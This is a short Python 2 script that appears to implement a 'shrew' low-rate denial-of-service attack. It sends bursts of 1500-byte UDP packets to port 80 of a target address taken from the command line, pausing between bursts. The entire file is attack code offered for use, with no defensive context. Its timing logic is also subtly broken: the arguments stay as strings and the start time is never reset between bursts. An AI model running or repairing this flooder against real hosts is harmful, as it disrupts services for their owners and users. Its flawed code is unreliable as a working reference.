#!/usr/bin/python

import socket
import sys
from time import time, sleep

""" Used http://www.binarytides.com/programming-udp-sockets-in-python/ """

def shrew():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	except socket.error:
		print 'Failed to create socket'
		sys.exit()
	start_time = time()
	addr = sys.argv[1]
	burst_period = sys.argv[2]
	burst_duration = sys.argv[3]
	msg = 'a' * 1500
	while True:
		# burst period
		while True:
			s.sendto(msg, (addr, 80))
			now = time()
			delta = now - start_time
			if delta > burst_duration:
				break

		#TODO sleep might not be precise enough
		# silent period
		sleep(burst_period)


if __name__ == "__main__":
	shrew()